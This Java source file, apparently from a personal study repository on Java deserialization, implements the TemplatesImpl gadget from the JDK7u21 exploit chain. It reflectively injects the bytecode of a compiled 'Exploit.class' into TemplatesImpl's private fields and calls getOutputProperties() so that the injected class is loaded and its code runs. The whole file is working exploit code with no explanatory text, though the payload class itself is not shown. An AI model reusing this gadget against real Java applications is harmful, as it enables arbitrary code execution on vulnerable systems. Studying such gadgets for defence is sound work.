import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Field;

public class templatesImpl {
    public static void main(String[] args) throws Exception{

        TemplatesImpl tmpl = new templatesImpl().getTmpl();
        tmpl.getOutputProperties();

    }

    public TemplatesImpl getTmpl() throws Exception{
        TemplatesImpl tmpl = new TemplatesImpl();

        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] bytes = new byte[1][];
        bytes[0] = readClassFileToByteArray("/Users/jijue/Documents/GitHub/JavaUnserial/JDK7U21/src/main/java/Exploit.class");
        bytecodes.set(tmpl, bytes);
        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(tmpl, "Exploit1");
//        Field tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(tmpl,new TransformerFactoryImpl());

        return tmpl;
    }

    public static byte[] readClassFileToByteArray(String filePath) throws IOException {
        File file = new File(filePath);
        byte[] fileData = new byte[(int) file.length()];
        try (FileInputStream fis = new FileInputStream(file)) {
            int bytesRead = fis.read(fileData);
            if (bytesRead != fileData.length) {
                throw new IOException("Failed to read the complete file");
            }
        }
        return fileData;
    }
}